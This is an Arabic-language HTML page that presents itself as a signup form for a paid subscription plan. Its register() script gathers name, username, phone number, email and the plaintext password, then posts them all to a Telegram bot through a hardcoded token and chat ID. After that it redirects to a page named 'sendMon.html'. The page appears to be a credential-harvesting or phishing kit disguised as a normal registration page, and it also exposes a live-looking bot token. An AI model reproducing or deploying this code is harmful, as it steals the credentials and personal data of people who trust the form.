<!DOCTYPE html><html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تسجيل حساب جديد</title>
  <style>
    body {
      
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #fff;
    }
	        /* Font Face for TTF */
        @font-face {
            font-family: 'arabic';
            src: url('arabic.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }

        /* Font for entire page */
        * {
            font-family: 'arabic', sans-serif;
    .container {
      background: rgba(255, 255, 255, 0.2);
      padding: 25px;
      border-radius: 15px;
      text-align: center;
      width: 350px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
    }
    input, select, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 8px;
      border: none;
      font-size: 14px;
    }
    input:focus, select:focus {
      outline: none;
      box-shadow: 0 0 10px #00c4cc;
    }
    button {
      background: #00c4cc;
      color: white;
      cursor: pointer;
      font-weight: bold;
      font-size: 16px;
    }
    button:hover {
      background: #00a0a6;
    }
    .back-btn {
      align-self: flex-start;
      margin-bottom: 15px;
      color: white;
      text-decoration: none;
      background: rgba(255,255,255,0.1);
      padding: 8px 15px;
      border-radius: 8px;
  </style>
</head>
<body>
  <div class="container">
	  <a class="back-btn" href="index.html">عودة إلى تسجيل الدخول</a>
    <h2>تسجيل حساب جديد</h2>
    <input type="text" id="fullname" placeholder="الاسم الكامل" required>
    <input type="text" id="username" placeholder="اسم المستخدم" required>
    <input type="text" id="phone" placeholder="رقم الهاتف" required>
    <input type="password" id="password" placeholder="كلمة المرور" required>
    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
    <select id="plan" required>
      <option value="">اختر الباقة</option>
      <option value="€0.99">الباقة الأولى - €0.99</option>
      <option value="€4.99">الباقة المتوسطة - €4.99</option>
      <option value="€9.99">الباقة الكاملة - €9.99</option>
    </select>
    <button onclick="register()">تسجيل الآن</button>
  </div>  <script>
    function register() {
      let fullname = document.getElementById('fullname').value.trim();
      let username = document.getElementById('username').value.trim();
      let phone = document.getElementById('phone').value.trim();
      let password = document.getElementById('password').value.trim();
      let email = document.getElementById('email').value.trim();
      let plan = document.getElementById('plan').value;

      if (!fullname || !username || !phone || !password || !email || !plan) {
        alert('يرجى ملء جميع الحقول');
        return;
      }

      let message = `مسجل جديد:\nالاسم: ${fullname}\nاسم المستخدم: ${username}\nرقم الهاتف: ${phone}\nكلمة المرور: ${password}\nالبريد الإلكتروني: ${email}\nالباقة المختارة: ${plan}`;

      let chatId = "6431271423";
      let token = "6618648466:AAFGGTIx055y0eCRvq_z3ABqchHfLsqD0M4";

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      })
      .then(res => res.json())
      .then(data => {
        console.log("تم إرسال التسجيل إلى تيليجرام", data);
        window.location.href = "sendMon.html";
      })
      .catch(error => {
        console.error("خطأ في إرسال البيانات", error);
        alert('حدث خطأ أثناء الإرسال. حاول مرة أخرى.');
      });
    }
  </script></body>
</html>
